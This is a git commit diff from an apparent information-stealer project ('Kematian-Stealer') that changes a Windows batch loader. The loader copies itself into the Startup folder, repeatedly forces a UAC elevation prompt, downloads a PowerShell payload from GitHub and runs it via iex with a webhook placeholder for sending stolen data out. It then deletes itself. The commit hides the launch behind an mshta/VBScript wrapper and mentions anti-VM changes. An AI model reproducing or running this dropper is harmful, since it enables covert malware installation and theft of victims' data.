5c6ebbc28ba11013ab1cfd14c4fbae2953aeb8bc
CHA1NSK1 <96607632+Chainski@users.noreply.github.com>
2024-05-21 22:45:30 -0500

    Updates (#224)
    * Update antivm.ps1
    
    * Updated antivm checklist
    
    * Update antivm.ps1
    
    * Add files via upload

--- frontend-src/main.bat
+++ frontend-src/main.bat
@@ -2,6 +2,6 @@
 cd /d "%~dp0"
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
 net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "while($true){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
+if not %errorlevel% == 0 ( powershell -Win Hidden -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
 del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
-(goto) 2>nul & start powershell -windowStyle hidden -c "$ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex" & del /f /q "%~f0"
+(goto) 2>nul & start mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex",0)) & del /f /q "%~f0"
